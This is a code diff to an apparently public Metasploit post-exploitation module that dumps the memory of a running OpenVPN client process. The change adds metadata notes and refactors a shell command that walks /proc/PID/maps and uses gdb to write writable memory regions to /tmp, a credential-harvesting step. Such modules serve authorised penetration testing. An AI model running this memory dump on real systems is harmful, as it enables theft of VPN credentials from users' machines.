@@ -28,16 +28,19 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => ['shell', 'meterpreter'],
         'References' => [
           ['URL', 'https://gist.github.com/rvrsh3ll/cc93a0e05e4f7145c9eb#file-openvpnscraper-sh']
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
-    register_options(
-      [
-        OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.']),
-        OptString.new('TMP_PATH', [true, 'The path to the directory to save dump process', '/tmp/'])
-      ], self.class
-    )
+    register_options([
+      OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.']),
+      OptString.new('TMP_PATH', [true, 'The path to the directory to save dump process', '/tmp/'])
+    ])
   end
 
   def pid
@@ -57,7 +60,10 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    dump = cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{tmp_path}#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done 2>/dev/null; echo $?')
+    cmd = "/bin/grep rw-p /proc/#{pid}/maps | "
+    cmd << 'sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | '
+    cmd << "while read start stop; do /usr/bin/gdb --batch-silent --silent --pid #{pid} -ex \"dump memory #{tmp_path}#{pid}-$start-$stop.dump 0x$start 0x$stop\"; done 2>/dev/null; echo $?"
+    dump = cmd_exec(cmd)
     if dump.chomp.to_i == 0
       vprint_good('Succesfully dump.')
     else
